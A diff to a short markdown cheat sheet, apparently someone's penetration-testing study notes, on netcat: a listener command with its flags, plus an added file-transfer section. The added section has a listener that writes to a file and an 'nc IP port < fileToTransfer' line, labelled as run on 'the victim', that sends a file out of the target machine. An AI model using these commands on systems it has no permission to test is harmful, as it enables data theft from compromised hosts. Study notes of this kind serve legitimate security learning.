@@ -4,6 +4,7 @@ tags:
   - fetus
 ---
 ## usage:
+#### listening
 
 ```zsh
 nc -nvlp 1337
@@ -12,3 +13,12 @@ nc -nvlp 1337
 - `-v` : verbose 
 - `-l` : listen mode 
 - `-p` : specifies the port to listen on
+#### file transfers 
+- run this on the local machine 
+```sh
+nc -nvlp port > fileName
+```
+- run this on the victim with the file to transfer 
+```sh
+nc IP port < fileToTransfer
+```
